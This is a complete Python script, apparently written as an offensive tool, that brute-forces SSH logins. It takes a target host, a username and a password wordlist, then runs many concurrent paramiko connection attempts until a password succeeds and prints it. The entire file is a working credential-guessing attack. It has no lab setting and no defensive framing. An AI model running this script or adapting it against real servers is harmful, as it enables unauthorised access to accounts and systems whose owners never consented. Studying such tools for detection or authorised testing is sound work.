import paramiko, sys, os, termcolor, socket
import threading, time, logging

def ssh_connect(usr_name, password):

    ssh_connection = paramiko.SSHClient()
    ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh_connection.connect(target, username=usr_name, password=password.strip(), port=22)
        code = 0
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2
    
    ssh_connection.close()
    
    return code

def try_password_thread():
    global found
    while not found:
        try:

            with thr_lock:
                try:
                    current_password_to_try = wordlist_iter.__next__()
                except:
                    return
            
            return_code = ssh_connect(ssh_usr_name, current_password_to_try)
            if return_code == 0:
                print(termcolor.colored((f'[+] Password found: {current_password_to_try}'), 'green'), end='')
                found = True
                return
            elif return_code == 1:
                print(termcolor.colored(f'[-] Password not {current_password_to_try}','blue'), end='')
            elif return_code == 2:
                print(termcolor.colored('[!] Cant connect! Did host go down?', 'red'))
                return
        except BaseException:
            print(termcolor.colored('Error!','red'))

            
        
        

if __name__ == '__main__':
    target = input(termcolor.colored('[+] Enter target: ', 'yellow'))
    ssh_usr_name = input(termcolor.colored('[+] Enter SSH username: ', 'yellow'))
    path_to_wordlist = input(termcolor.colored('[+] Enter path/to/wordlist: ', 'yellow'))
    concurrent_connections = int(input(termcolor.colored('[+] Enter amount of concurrent connections: ', 'yellow')))
    found = False

    if not os.path.exists(path_to_wordlist):
        print(termcolor.colored(('[!] Wordlist not found.\n[-] Exiting...'), 'red'))
        sys.exit(1)

    if ssh_connect('test','test') == 2:
        print(termcolor.colored('[!] Cant connect! Is host up?\n[-] Exiting...', 'red'), )
        sys.exit(1)

    thr_lock = threading.Lock()

    with open(path_to_wordlist, 'r') as wordlist:
        wordlist_iter = wordlist.__iter__()
        
        print()
        threads = []
        for t in range(concurrent_connections):
            threads.append(threading.Thread(target=try_password_thread))

        for t in range(concurrent_connections):
            threads[t].start()
        
        for t in range(concurrent_connections):
            threads[t].join()


    if not found:
        print(termcolor.colored('[-] Password not found.\n[-] Exiting', 'red'))
